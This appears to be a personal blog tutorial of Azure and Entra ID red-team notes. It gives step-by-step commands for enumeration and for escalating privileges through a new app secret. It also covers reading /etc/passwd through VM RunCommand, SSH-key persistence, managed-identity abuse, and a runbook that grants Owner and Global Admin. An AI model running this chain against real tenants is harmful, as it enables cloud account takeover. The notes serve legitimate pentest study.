# First of All

## Before Thinking of Attacking Azure

- Start with [John Savill - AZ-900 Prep Youtube Playlist](https://www.youtube.com/watch?v=pY0LnKiDwRA&list=PLlVtbbG169nED0_vMEniWBQjSoxTsBYS3&index=2) to understand the Azure Fundamentals
- Read articles on [AAD Internals](https://aadinternals.com/) and [Hausec](https://hausec.com/)

> Ok, now u can start to look

- [My post: Intro to Cloud](https://johnermac.github.io/notes/cloud/introcloud/)
- [This Post: Get Familiar with Azure Pentesting](https://johnermac.github.io/notes/cloud/midazure/)
- [Hacktricks Content about Azure](https://cloud.hacktricks.xyz/pentesting-cloud/azure-security)

## Important Clarification

> *it's confusing but here we go*

As Housec well said in his [POST](https://hausec.com/2021/10/26/attacking-azure-azure-ad-part-ii/). 

Think of **Azure AD** as the **Authentication** part of Azure and Office 365. If someone says only **Azure**, they are talking mostly about **Resources**

> AzureAD == EntraID == Authentication / Identification

> Azure == Resources / Subscriptions

> AzureAD != Azure

*You may ask: Why it's important to differentiate?*

- Its important because their Access and Permissions are separated! 
- In Azure terms: Permission is a Role, and their access control is Role-Based (RBAC)
- Lets say you have an Access to something in **AzureAD**, it does not give you Access with the same Role in **Azure**! (This goes both ways!)
- These Roles define what you can and cannot do with certain objects
- But again, their permission is Separated.

> I think that's why they changed from AzureAD to EntraID

## Other thing - Tools

Because of that, It makes the tools a bit confusing too. 

Some tools can access only the Resource side and others only the EntraID side

For example:

- az cli = Can manage Azure resources
- Az PowerShell module (Replaced the AzureRM and Azure module) = Can manage both
- AzureAD PowerShell module = Can be used for EntraID and o365 (but its Available only Until june 2025)
- MSGraph Module - is an API wrapper for MSGraph API (it replaces AzureAD) - The usability is the same - EntraID and o365 Services

> I said it was confusing lol. Anyway, lets go for the Notes


# Introduction

## Portals
- Azure Resource Manager Portal: [portal.azure.com](https://portal.azure.com)
- O365 / M365 Admin Center: [admin.microsoft.com](https://admin.microsoft.com)
- O365 / M365 User Portal: [office.com](https://office.com)

## Credentials
- User + Password = Long Term Access
- Service Principal (App ID + Password or Certificate) = Long Term Access
- Access Token (Account ID + Access Token) = Short Term Access

## CLI Tools
- AZ (Cross Platform)
- Az PowerShell
- Azure-AD PowerShell
- MsOnline PowerShell
- MSGraph Powershell

## Authentication Methods in Azure and Azure AD

## API Connections

- Azure-AD > portal.azure.com > Azure AD = API graph.microsoft.net - [in the future Connect-MgGraph]
- AZ CLI and Az PowerShell > portal.azure.com > ARM = API management.azure.com
- REST API > M365 = API graph.microsoft.com

# Enum

> Azure Active Directory (Azure AD) is Microsoft enterprise cloud-based identity and access management (IAM) solution

> Azure AD is the backbone of the o365 system, and it can sync with on-premise AD and provide authentication to other cloud-based systems via OAuth


## Azure AD

- Users
- Groups
- Devices
- App Registration
- Enterprise App (Service Principal)
- Roles (Used to manage objects)


## Azure Resource Manager (ARM)

- Its the native platform for infrastructure as code (IaC) in Azure
- Provides Infrastructure as a Service (IaaS), Platform as a service (PaaS) and Software as a Service (SaaS)
- Azure ARM manage access control by RBAC

# Red Team Operations

## Objectives

- Global admin 
- Owner permission on Azure subscriptions
- Exfiltration Critical data / Information
- Ransomware activities simulation 
- Crypto mining simulation
- High value targets office ccount access


## Starting Recon

**Public available sources**

- DNS Records
- Sub-Domains mapped to azure
- Leaked Programmatic Credentials [Service Principal - AppID & Secret / Certificate ]
- Compromised Credential [Dark web]
- Employee Information [Email, Designation ]

Use [AAD OSINT](https://aadinternals.com/osint/) to get info

Use [MicroBurst](https://github.com/NetSPI/MicroBurst) to enum subdomains, blob storage

## *Found credential? Try to access AAD and ARM*

- AAD can be accessed with AzureAD and MSGraph
- ARM can be accessed with Azure CLI 
- If the credential can be logged, the user does not have access


**in AzureAD**

Get the objID:
```powershell
Get-AzureADUser -SearchString “user”
```

To show permissions of the user:
```powershell
Get-AzureADUserMembership -ObjectID <objID> | ConvertTo-Json
```


> *Next STEP? Look for Applications!*

```powershell
Get-AzureADApplication
```

```powershell
Get-AzureADApplicationOwner -ObjectId <objID>
```

> *What sort of permissions the user have on the App?*

```powershell
$app = Get-AzureADApplication -ObjectID <objID>
$app.RequiredResourceAccess | ConvertTo-Json -Depth 3
# result would be the permissions in Graph API
```

> For **User** or **SP** - check **Directory Role**
> For **App** - check **API permissions**

API Permissions:
```powershell
$sp = Get-AzureADServicePrincipal -All $true | Where-Object {$_.AppId -eq ‘<Resource appID>’}
$sp.AppRoles | Where-Object {$_.Id -eq ‘<Id from ResourceAccess>’}
```

> *In this case we have Role Management Permission, which allow us to escalate privileges by creating credential to the Directory Role*


Get the **Secret** :
```powershell
New-AzureADApplicationPasswordCredential -ObjectID <objID of the Application>
```

Get the **Tenant ID**:

[Tenant Info](https://login.windows.net/domain/.well-known/openid-configuration)

**Authenticate with the NEW Crendential**:
```powershell
az login --service-principal -u <App ID> -p <secret generated> -t <tenant ID>
```

> *Now we have access to the subscription, it means not only to the Azure-AD as before, but also for the ARM. That is why we could login with AZ CLI without problems*


## *You are logged with new credential? Check the permissions!*

Now we can check with AZ CLI:
```powershell
az role assignment list
az role assignment list --assignee “Application ID = same that we use in the -u of az login”
az role assignment list --assignee “Application ID = same that we use in the -u of az login” -All
```


> *In this case, the user has **VM-RunCommand** access to a VM. We can use that for lateral movement*

List VMs:
```powershell
az vm list
az vm list-ip-addresses --resource-group <RESOURCE GROUP> --name <VM NAME> 
```


Execute Command:
```powershell
az vm run run-command invoke --resource-group <RESOURCE GROUP> -n <VM name> --comand-id RunShellScript --scripts “id && hostname && whoami && cat /etc/passwd”
```

## *Lets add Persistence!*

Generate a SSH-Key in your machine:
```powershell
ssh-keygen.exe
```

then copy the .pub to the target machine:
```powershell
az vm run-command invoke --resource-group <> -n <> --comand-id RunShellScript --scripts “echo ‘ssh-rsa-key ...’ >> /home/user/.ssh/authorized_keys”
```

Access the VM via SSH:
```powershell
ssh -i <private key> user@ip
```



## *Inside the target VM? What to do?*
> - You can grab the token!

To do that u can install the AZ CLI, other tool, call the API directly or retrieve from metadata endpoint

Install AZ CLI:
```powershell
curl -L https://aka.ms/InstallAzureCLIDeb | sudo bash
```


```powershell
az account list
```

If there is a managed identity attached to this account we can authenticate with:
```powershell
az login --identity
```


> *In this case, its a SYSTEM IDENTITY*

Grab the **principalId** with **az vm list**

Check the **Role Asssignment** for this **Identity**:
```powershell
az role assignment list --assignee “<the principalID of the VM = which works as a object ID because its a System identity>” --all
```


> *We found that the Identity has **Role: Contributor** it can be checked in the **RoleDefinitionName** option*

> *Contributor is like Editor in GCP. Except from Role Assignment it can do everything*



Enumerate Automation Account - its a path to escalate to **Owner**:
```powershell
az automation account list
```

Enumerate Identities:

```powershell
az identity list
```

Grab the principalID of the identity and check the Role Assignment:
```powershell
az role assignment list --assignee “<principalId>” --all
```

**Perform Operation on Automation Account**

List runbook:
```powershell
az automation runbook list --automation-account-name “<name>” --resource-group “<RG>”
```

AutomationAccountPrivesc.ps1
```powershell
# Exemple of runbook

# Enable appropriate RBAC permissions to the system identity of this automation account. Otherwise, the runbook will fail

try
{
  Connect-AzAccount -Identity
}
catch {
  throw $_.Exception
}

# Get all ARM resources from all resources groups
New-AzRoleAssignment -ObjectId “objID of your user” -RoleDefinitionName Owner -Scope “/subscriptions/<subscription ID>”
```

## Now create a runbook and upload the powershell code to be executed


```powershell
az automation runbook create --automation-account-name “...” --resource-grouop “...” --name “privesc” --type “Powershell” --location “East US”
az automation runbook replace-content --automation-account-name “...” --resource-group “...” --name “privesc” --content AutomationAccountPrivesc.ps1
az automation runbook publish --automation-account-name “...” --resource-group “...” --name “privesc”
az automation runbook show --automation-account-name “...” --resource-group “...” --name “privesc” 
```

Invoke the runbook:
```powershell
az automation runbook start --automation-account-name “...” --resource-group “...” --name “privesc” 
```


After some time, check the role assignment of the modified user to see owner privilege added:
```powershell
az role assignment list --assigne “objID of the user” --all
```


> [NOTE] *With Role Management Write, u can write your user to any group including GA*

> *but for that... To authenticate on behalf of applications (SP) u need to generate a certificate in order to log using AzureAD utility*

With this access u can simply add yourself as Global Admin with this command:
```powershell
Get-AzureADDirectoryRole
Add-AzureADDirectoryRoleMember -ObjectID <objID of GA> -RefObjectId <objID of your user>
```
